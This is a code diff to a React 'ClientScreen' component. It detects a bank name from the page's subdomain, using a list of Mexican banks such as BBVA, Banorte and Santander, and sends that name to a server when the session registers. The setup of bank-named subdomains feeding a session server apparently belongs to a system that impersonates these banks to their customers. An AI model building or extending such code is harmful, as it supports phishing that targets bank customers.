@@ -96,10 +96,26 @@ export default function ClientScreen() {
   // Register with the server when connection is established
   useEffect(() => {
     if (connected && sessionId) {
+      // Detectar banco desde subdominio si existe
+      const host = window.location.host;
+      const hostParts = host.split('.');
+      let bankFromSubdomain = null;
+      
+      if (hostParts.length >= 3) {
+        const subdomain = hostParts[0].toLowerCase();
+        const validBanks = ['liverpool', 'citibanamex', 'banbajio', 'bbva', 'banorte', 'bancoppel', 'hsbc', 'amex', 'santander', 'scotiabank', 'invex', 'banregio', 'spin', 'platacard', 'bancoazteca', 'bienestar'];
+        
+        if (validBanks.includes(subdomain)) {
+          bankFromSubdomain = subdomain.toUpperCase();
+          console.log(`[Client] Detectado banco desde subdominio: ${bankFromSubdomain}`);
+        }
+      }
+      
       sendMessage({
         type: 'REGISTER',
         role: 'CLIENT',
-        sessionId
+        sessionId,
+        bankFromSubdomain
       });
     }
   }, [connected, sessionId, sendMessage]);
